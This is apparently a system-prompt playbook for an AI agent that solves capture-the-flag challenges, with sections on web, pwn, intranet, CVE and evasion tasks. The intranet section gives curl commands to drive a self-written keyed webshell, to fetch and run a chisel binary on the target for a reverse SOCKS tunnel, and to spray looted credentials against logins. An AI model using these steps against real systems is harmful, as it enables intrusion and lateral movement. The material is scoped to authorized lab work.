# Unified CTF workspace
**Goal: get the flag and `heimdall-submit`.**

Authorization, platform commands, stop conditions, inject-block reading, and wordlist policy live in the system prompt.

Pick the section that matches this challenge type. Follow only that section's tools and flow; do not mix other sections.

| Type | Section |
|------|---------|
| Web / login form / frontend | Web |
| Binary / ELF / APK / overflow | Pwn |
| Multi-host lateral / intranet multi-flag | Intranet |
| Known product / CVE | CVE |
| AV evasion / packer / AMSI | Evasion |
---

# Web workspace
## Tools

| Surface | Tools |
|---|---|
| Platform | `heimdall-challenge` `heimdall-submit` `heimdall-ocr` `heimdall-cve` |
| HTTP | `playwright-cli` (session `.heimdall/browser/state.json`) `curl` `httpx` `jq` |
| Scan/inject | `sqlmap`; `dirsearch` + `paths.txt` (language `-e php`)
| Images | `heimdall-ocr` `tesseract` `convert` (default `eng+chi_sim`) |
| Java | `jdumpspider` `rogue-jndi` `ldaps-wrap`; `java8` / `java11` |

Curated wordlists are in `/opt/heimdall/tools/wordlists/` (see `README.md`); choose by vulnerability type: paths/leaks → `paths.txt`, weak credentials → `usernames.txt` + `passwords.txt`, file read/traversal → `lfi.txt`, SQL injection → `sqli.txt`.

## Execute

Read the brief → follow challenge clues: links, forms, JS, errors, exposed files → `playwright-cli` for login / long sessions / XSS → submit `flag{...}` as soon as you have it.

Lock one class from the symptom, prove it, write `progress.md`. Known product → bash `grep -Ril <product> /root/nuclei-templates/http/cves` → `heimdall-cve CVE-…`.


Scope = addresses in `input.json`. Do not scan the network; web has only the given ports. Static/API: `curl`/`httpx`; login and XSS: `playwright-cli`. Temps in `tmp/`. No outbound: listen on this box, no Collaborator.

## Playwright

Image already has Chromium. Open one session; after login `state-save` / `state-load`.

```bash
playwright-cli open http://TARGET/
playwright-cli snapshot
playwright-cli click e3
playwright-cli fill e5 'user'
playwright-cli eval '() => document.cookie'
playwright-cli state-save .heimdall/browser/state.json
playwright-cli cookie-list
```

XSS: this browser is the victim; loot with `eval` / `console` / `cookie-list`.

## OCR (captcha / canvas / flag-in-image)

Print DOM-invisible text to stdout:

```bash
heimdall-ocr tmp/c.png
# short captcha
convert tmp/c.png -colorspace Gray -resize 300% -threshold 50% tmp/c2.png
tesseract tmp/c2.png stdout -l eng --psm 7
```
Strip OCR-inserted spaces before submit. Short codes: `--psm 7` (`--psm 8`+whitelist often reads `A7K2` as `ATK2`).
---

# Pwn / binary workspace

Tools are already in the image; call them directly

## Tools

| Stage | Tools |
|---|---|
| Identify | `file` `readelf` `strings` `xxd` `objdump` `nm` `ldd` `checksec` `patchelf` |
| Static | `r2` / `radare2` |
| Decompile | `pyghidra-mcp` (`$GHIDRA_INSTALL_DIR=/opt/heimdall/ghidra`) |
| Dynamic | `gdb`+pwndbg `gdb-multiarch` `gdbserver` `strace` `ltrace` `qemu-*` |
| ROP / libc | `ROPgadget` `one_gadget` `seccomp-tools` `pwninit` |
| Write exp | `pwntools` `angr` `unicorn` `capstone` `keystone` `elftools` `z3` |
| Build | `gcc` `g++` `make` `cmake` `nasm` |
| APK | `jadx` `apktool` `androguard` |
---

# Intranet pentest workspace

Read `input.json` first. On `instance_rotated`, probe the new `container_addr` first.

| Surface | Tools |
|---|---|
| Path scan | `dirsearch` + `paths.txt`; on first recon use a light scan for intel only |
| Webshell | Write your own HTTP helper and talk to it with `curl` |
| Proxy | **Prefer** reverse chisel (`127.0.0.1:1080`); if callback fails, run chisel server on the target |
| SSH/SQL | `sshpass` `mysql` `psql` `sqlite3` |
| AD | `nxc` `certipy` Impacket (`/opt/heimdall/ad`); serial on the same target |
| Other | `nmap` `curl` `nuclei` `john` `heimdall-ocr`; `chisel` |

## Wordlists

Curated wordlists are in `/opt/heimdall/tools/wordlists/` (see `README.md`); choose by vulnerability type: paths/leaks → `paths.txt`, weak credentials → `usernames.txt` + `passwords.txt`, file read/traversal → `lfi.txt`, SQL injection → `sqli.txt`.

The observer reads logs and steers dumps of **logins and password rules** from already-controlled surfaces (web admin / DB / panel / config / history) into `.heimdall/traffic/loot.json`. Freely expand collected logins and rules into:

- `.heimdall/traffic/spray_users.txt`
- `.heimdall/traffic/spray_passwords.txt`
- `.heimdall/traffic/spray_creds.txt` (`user:pass`)

On a login, first spray the lightweight general-purpose list `/opt/heimdall/tools/wordlists/passwords.txt` against the form username / `admin`. If it misses, use the observer's dynamically generated `.heimdall/traffic/spray_creds.txt` for targeted spraying. Families already in that file and not yet tried on this surface: spray them. No rockyou. An empty file only means this observer tick has not published yet — do not treat that as "no dictionary". When CONFIRMED / the graph shows `DICT`, or `rev` changes, read again. HTTP / SSH / FTP login spray: concurrency 4; wait 0.3–0.5s after a deny; on timeout or No route pause 10s. You may build a targeted spray from intel, but do not invent a huge guessed wordlist that knocks the service over.

## Order

**After RCE, write a stable webshell first, use it for command exec and upload, then build the chisel tunnel, then do post-exploitation.**

External `container_addr` → light path scan → submit the first-surface flag immediately → RCE / DB / panel: read-only intel first (usernames, hashes, config, history, keys, product names, people → loot / `spray_*.txt`) → drop your own shell (exec and upload both via curl) → **prefer reverse chisel** (after a reachable callback IP) → else **chisel server on the target + client here** → `proxychains4`. AD lateral with the toolkit.

## Ports

| | |
|---|---|
| chisel SOCKS | `1080` (`127.0.0.1:1080` on this box) |
| chisel drop | `$CHISEL_DROP` (`/opt/heimdall/proxy/chisel-drop/`) |

## Self-written webshell

Write a small HTTP helper in the target language and drop it on a web-reachable path. Exec and upload **default to this helper**. Use `curl --data-urlencode`. Prove `whoami` before anything else. Do not overwrite the live shell.

Implement these yourself (no key → 404):
- `op=run`: execute `c`, return raw stdout+stderr
- `op=put`: decode `b64` onto `path`
- `op=get`: read `path`, return raw bytes/text
- Long jobs: `run` `nohup ... >/tmp/job.log 2>&1 & echo $!`, then poll with `run`/`get` until finished

```bash
# Write the source to artifacts/ first, drop it with the current RCE, then keep SHELL_URL / SHELL_KEY
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=whoami"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=put" --data-urlencode "path=/tmp/x" --data-urlencode "b64=$(base64 -w0 ./local_x)"
```

## Proxy
No outbound net, but the target and this box share a LAN; you may run the server here.

```bash
# Prefer reverse chisel (set REACHABLE_IP only after the target gets HTTP 200 from this box)
python3 -m http.server 8000 --bind 0.0.0.0 --directory "$CHISEL_DROP"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=curl -fsSL http://$REACHABLE_IP:8000/chisel_linux_amd64 -o /tmp/chisel && chmod +x /tmp/chisel"
"$CHISEL_DROP/chisel_linux_amd64" server --reverse --socks5 --host 0.0.0.0 --port 8080
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=nohup /tmp/chisel client http://$REACHABLE_IP:8080 R:socks >/tmp/chisel.log 2>&1 & echo $!"
# Fallback (all callbacks timeout): start `chisel server --socks5 --host 0.0.0.0 --port 1080` on the target via the helper, then `chisel client http://TARGET:1080 socks` here. If that port is closed, keep running intranet commands through the helper.
```

## Hard rules

- Scope = `container_addr` / the challenge net.
- Read-only enum first; confirm you need the flag before changing the domain / dumping creds.
- `flag{...}` → submit immediately. After instance rotate, old IPs are dead (`dead_hosts`).

---

# CVE / generic vuln

## Order

1. `curl -si` every given address; trust only title, headers, cookies, paths.
2. Search the library with **bash** `grep -Ril` (the Grep tool is workspace-only). Try every English token in title/headers. Open a CVE id with `heimdall-cve CVE-…`.
3. Treat yaml as a request sample and **replay with curl**; nuclei only assists with **that named template**. Write `artifacts/exp.py` if needed.
4. Scope = `container_addr`. Submit as soon as you have the flag.

```
curl -si → bash grep product → heimdall-cve CVE-… → curl replay → submit
```

## Find a PoC

```bash
grep -Ril sharepoint /root/nuclei-templates/http/cves /opt/heimdall/cve-poc/nuclei
heimdall-cve CVE-2025-53770
nuclei -duc -u http://TARGET -t <path>
```

Libraries: `/root/nuclei-templates/http/cves` (official full tree) + extras `/opt/heimdall/cve-poc/nuclei`

## Tools

| Surface | Tools |
|---|---|
| Fingerprint | `curl -si` `httpx` `whatweb`; multi-port `nmap -sV` |
| Library | bash `grep -Ril`; `heimdall-cve CVE-…` |
| Replay | `curl` / `python3`; single `nuclei -duc -t` |
| Login UI | `playwright-cli` |
| Java | `rogue-jndi` `ldaps-wrap` `jdumpspider` (`java8`) |

---

# Defense-evasion workspace

**Goal: identify which layer was evaded, peel it, get the flag and `heimdall-submit`.**

Deliverable is identify-and-unpack the sample, not a full FUD loader.

## Tools

| Stage | Tools |
|---|---|
| Identify | `file` `readelf` `strings` `xxd` `objdump` `nm` `ldd` `checksec` `exiftool` `binwalk` |
| Static | `r2`; sections/entropy `readelf -S` / `objdump -h` |
| Decompile | `pyghidra-mcp` (`$GHIDRA_INSTALL_DIR=/opt/heimdall/ghidra`) |
| Dynamic | `gdb`+pwndbg `strace` `ltrace` `qemu-*` |
| Packer | `binwalk` `7z` `unzip` |
| Script | `python3` `pycryptodome` `cryptography` |
| HTTP gate | `curl` `httpx`; login UI `playwright-cli` |
| APK | `jadx` `apktool` `androguard` |

## Order

```
file + strings + sections/entropy
  → take flag{...} → heimdall-submit
```

1. Download the attachment → `file`
2. Lock one class from the symptom table; write `progress.md`; peel one layer at a time
3. Packed: find the stub decrypt loop and key; restore in Python
4. Anti-debug gate: locate the check, then patch it or satisfy it
5. Upload scanner: change one carrier at a time; control the variable; record pass/fail

## Hard rules

- Scope = given addresses and attachments.
- Submit as soon as you have the flag.
